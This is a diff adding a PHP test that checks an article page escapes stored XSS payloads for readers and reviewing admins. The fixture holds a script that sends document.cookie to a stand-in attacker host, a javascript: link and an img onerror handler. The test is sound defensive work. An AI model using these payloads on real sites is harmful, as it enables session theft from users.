@@ -147,6 +147,40 @@ test('guests can view an article', function () {
         ->assertSee($article->title());
 });
 
+test('stored article scripts are escaped for readers and reviewing admins', function (bool $review) {
+    $body = <<<'MARKDOWN'
+<script>
+alert(document.cookie);
+var i = new Image;
+i.src = "https://attacker.example/?" + document.cookie;
+</script>
+
+[unsafe link](javascript:alert(1))
+
+<img src="x" onerror="alert(document.cookie)">
+MARKDOWN;
+
+    $article = Article::factory()->create([
+        'body' => $body,
+        'submitted_at' => now(),
+        'approved_at' => $review ? null : now(),
+    ]);
+
+    if ($review) {
+        $this->loginAsAdmin();
+    }
+
+    $this->get('/articles/'.$article->slug())
+        ->assertOk()
+        ->assertSee('&lt;script&gt;', false)
+        ->assertSee('<a>unsafe link</a>', false)
+        ->assertSee('&lt;img src=', false)
+        ->assertDontSee("<script>\nalert(document.cookie);", false)
+        ->assertDontSee('<img src="x" onerror=', false);
+
+    expect($article->fresh()->body())->toBe($body);
+})->with([false, true]);
+
 test('articles with links do not include a nofollow attributes', function () {
     $article = Article::factory()->approved()->create([
         'slug' => 'my-first-article',
